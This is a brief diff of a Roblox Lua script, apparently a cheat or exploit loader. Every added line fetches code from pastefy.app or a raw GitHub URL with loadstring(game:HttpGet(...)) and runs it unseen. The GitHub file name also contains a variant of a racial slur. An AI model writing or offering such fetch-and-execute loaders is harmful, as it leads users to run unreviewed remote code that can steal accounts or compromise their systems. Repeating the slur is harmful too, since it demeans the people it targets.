@@ -1,1 +1,5 @@
-loadstring(game:HttpGet("https://pastefy.app/jd6dU6cI/raw"))()
+local Spawner = 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/iwantsom3/script/refs/heads/main/Niggggfd.lua"))()
+Spawner.Load()
+wait(2)
+loadstring(game:HttpGet("https://pastefy.app/G4pscCQ2/raw"))()
